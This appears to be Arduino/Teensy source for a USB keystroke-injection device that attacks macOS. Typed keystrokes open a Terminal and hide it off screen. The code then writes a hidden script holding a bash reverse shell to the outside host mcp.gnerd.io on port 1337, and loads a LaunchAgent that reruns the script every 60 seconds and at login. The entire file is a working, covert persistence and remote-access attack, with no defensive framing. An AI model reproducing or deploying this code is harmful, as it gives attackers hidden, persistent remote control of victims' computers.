// delay ms
int ds = 500;
int LED_PIN = 13;

void setup() {
  // give us a little time to connect up
  delay(1000);

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // open Terminal
  openapp("Terminal");
  delay(ds * 2);

  // attempt to kill anything that may be running
  cmd(KEY_N);

  // move window so content is not visible
  hideTerm();

  // clear
  typeln("clear");

  // create main script
  typeln("mkdir ~/Library/.hidden");

  typeln("mkdir ~/Library/.hidden");
  typeln("echo '#!/bin/bash");
  typeln("bash -i >& /dev/tcp/mcp.gnerd.io/1337 0>&1");
  typeln("wait' > ~/Library/.hidden/connect.sh");

  // make executable
  typeln("chmod +x ~/Library/.hidden/connect.sh");

  // clear
  typeln("clear");

  // add launch agent:
  typeln("mkdir ~/Library/LaunchAgents");

  typeln("echo '<plist version=\"1.0\">");
  typeln("<dict>");
  typeln("<key>Label</key>");
  typeln("<string>com.gnerdsec.orifice</string>");
  typeln("<key>ProgramArguments</key>");
  typeln("<array>");
  typeln("<string>/bin/sh</string>");
  typeln("<string>'$HOME'/Library/.hidden/connect.sh</string>");
  typeln("</array>");
  typeln("<key>RunAtLoad</key>");
  typeln("<true/>");
  typeln("<key>StartInterval</key>");
  typeln("<integer>60</integer>");
  typeln("<key>AbandonProcessGroup</key>");
  typeln("<true/>");
  typeln("</dict>");
  typeln("</plist>' > ~/Library/LaunchAgents/com.gnerdsec.orifice.plist");

  // set permissions:
  typeln("chmod 600 ~/Library/LaunchAgents/com.gnerdsec.orifice.plist");

  // go:
  typeln("launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist");

  cmd(KEY_Q);

  // turn off led when done
  digitalWrite(LED_PIN, LOW);
}

void loop() {

}

// custom functions

void hideTerm(){
  typeln( "osascript -e 'tell application \"Terminal\"");
  typeln( "    tell window 1");
  typeln( "        set size to {10, 10}");
  typeln( "        set position to {5000, 5000}");
  typeln( "    end tell");
  typeln( "end tell'");
}

void typeln(String chars){
  Keyboard.print(chars);
    delay(50);
  Keyboard.println("");
    delay(50);
}

void openapp(String app){
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}

void ctrl(int key){
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key){
  mod(MODIFIERKEY_GUI, key);
}

void mod(int mod, int key){
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}
